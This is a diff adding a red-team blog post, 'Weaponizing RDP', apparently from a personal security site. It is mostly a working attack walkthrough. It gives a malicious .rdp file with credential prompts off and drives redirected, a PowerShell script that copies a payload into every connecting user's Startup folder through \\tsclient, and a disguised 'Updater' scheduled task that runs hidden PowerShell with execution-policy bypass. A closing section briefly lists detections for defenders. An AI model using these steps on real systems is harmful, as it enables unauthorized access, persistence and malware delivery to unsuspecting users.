@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Weaponizing RDP :: CyberSecrets</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="🖥️ Weaponizing RDP Files for Initial Access – A Red Team Technique Disclaimer: This post is for educational and ethical red teaming purposes only.
+Remote Desktop Protocol (.RDP) files are often considered benign by end users and IT admins alike. But under the right circumstances, they can be weaponized to deliver payloads — an advanced technique often explored in controlled penetration testing environments.
+In this post, we walk through the essentials of RDP file weaponization and automation using Task Scheduler and PowerShell.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/weaponizing-rdp/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Weaponizing RDP">
+<meta property="og:description" content="🖥️ Weaponizing RDP Files for Initial Access – A Red Team Technique Disclaimer: This post is for educational and ethical red teaming purposes only.
+Remote Desktop Protocol (.RDP) files are often considered benign by end users and IT admins alike. But under the right circumstances, they can be weaponized to deliver payloads — an advanced technique often explored in controlled penetration testing environments.
+In this post, we walk through the essentials of RDP file weaponization and automation using Task Scheduler and PowerShell.
+" />
+<meta property="og:url" content="/posts/weaponizing-rdp/" />
+<meta property="og:site_name" content="CyberSecrets" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-05-29 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/weaponizing-rdp/">Weaponizing RDP</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-05-29</time><span class="post-author">[aibel]</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/blog/">blog</a>&nbsp;
+      
+      #<a href="/tags/redteam/">redteam</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="-weaponizing-rdp-files-for-initial-access--a-red-team-technique">🖥️ Weaponizing RDP Files for Initial Access – A Red Team Technique<a href="#-weaponizing-rdp-files-for-initial-access--a-red-team-technique" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><em>Disclaimer: This post is for educational and ethical red teaming purposes only.</em></p>
+<hr>
+<p>Remote Desktop Protocol (.RDP) files are often considered benign by end users and IT admins alike. But under the right circumstances, they can be weaponized to deliver payloads — an advanced technique often explored in controlled penetration testing environments.</p>
+<p>In this post, we walk through the essentials of RDP file weaponization and automation using Task Scheduler and PowerShell.</p>
+<hr>
+<h2 id="-objective">🎯 Objective<a href="#-objective" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><strong>Abuse RDP file trust</strong> to gain initial access</li>
+<li><strong>Automate payload execution</strong> when an RDP session is established</li>
+<li><strong>Operate stealthily</strong> by using PowerShell and Windows Task Scheduler</li>
+</ul>
+<hr>
+<h2 id="-step-1-crafting-the-rdp-file">🔧 Step 1: Crafting the <code>.rdp</code> File<a href="#-step-1-crafting-the-rdp-file" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>An <code>.RDP</code> file can be modified to connect to a specified IP while maintaining a typical user experience. Here&rsquo;s a sample configuration you can build upon:</p>
+<pre tabindex="0"><code class="language-rdp" data-lang="rdp">full address:s:192.168.50.132
+prompt for credentials:i:0
+redirectclipboard:i:1
+devicestoredirect:s:*
+drivestoredirect:s:*
+</code></pre><p>This enables clipboard access and device/drive redirection — which can be abused by attackers for lateral movement or persistence.</p>
+<hr>
+<h2 id="-step-2-powershell-payload-to-copy-a-binary-to-startup-folder">🧪 Step 2: PowerShell Payload to Copy a Binary to Startup Folder<a href="#-step-2-powershell-payload-to-copy-a-binary-to-startup-folder" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Users</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="s2">&#34;\\tsclient\C\Users&#34;</span> <span class="n">-Directory</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Name</span> <span class="o">-notlike</span> <span class="s2">&#34;Public&#34;</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Name</span> <span class="o">-notlike</span> <span class="s2">&#34;Default*&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$User</span> <span class="k">in</span> <span class="nv">$Users</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$StartupPath</span> <span class="p">=</span> <span class="s2">&#34;\\tsclient\C\Users\</span><span class="p">$(</span><span class="nv">$User</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Copy-Item</span> <span class="n">-Path</span> <span class="s2">&#34;C:\Users\admin\Documents\RDP-Exploit\hello.exe&#34;</span> <span class="n">-Destination</span> <span class="nv">$StartupPath</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This script looks for user directories and places the payload (<code>hello.exe</code>) into their startup folder — ensuring it executes on their next login.</p>
+<hr>
+<h2 id="-step-3-automating-with-task-scheduler">⏲️ Step 3: Automating with Task Scheduler<a href="#-step-3-automating-with-task-scheduler" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Set up a scheduled task that triggers upon a remote desktop connection. This allows code execution at the exact moment the target logs in.</p>
+<h3 id="general-tab">General Tab<a href="#general-tab" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Name the task (e.g., <code>Updater</code>)</li>
+<li>Run only when the user is logged in</li>
+<li>Run with highest privileges</li>
+</ul>
+<p><img src="Pasted%20image%2020250120173230.png" alt=""></p>
+<hr>
+<h3 id="trigger-configuration">Trigger Configuration<a href="#trigger-configuration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Choose <code>On connection to user session</code></li>
+<li>Target all users for broader coverage</li>
+</ul>
+<p><img src="Pasted%20image%2020250120173241.png" alt=""></p>
+<hr>
+<h3 id="action-configuration">Action Configuration<a href="#action-configuration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Command:</p>
+<pre tabindex="0"><code>powershell.exe -WindowStyle Hidden -Ep Bypass -c C:\Users\admin\Downloads\Hacking\RDP-Exploit\run.ps1
+</code></pre><p>This ensures silent execution of your PowerShell script on login.</p>
+<p><img src="Pasted%20image%2020250120173258.png" alt=""></p>
+<hr>
+<h2 id="-ethics--defense">⚠️ Ethics &amp; Defense<a href="#-ethics--defense" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This technique should <em>only</em> be practiced in lab environments with proper consent. Defenders can detect this with:</p>
+<ul>
+<li>PowerShell logging</li>
+<li>Monitoring Task Scheduler activity</li>
+<li>Inspecting <code>.RDP</code> files for unusual settings</li>
+</ul>
+<hr>
+<h2 id="-final-thoughts">📌 Final Thoughts<a href="#-final-thoughts" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>RDP files are often overlooked as attack vectors. Weaponizing them shows how even common administrative tools can be turned into attack surfaces when combined with automation.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="/posts/my-oscp-journey/" class="button inline next">
+         [<span class="button__text">My OSCP Journey</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
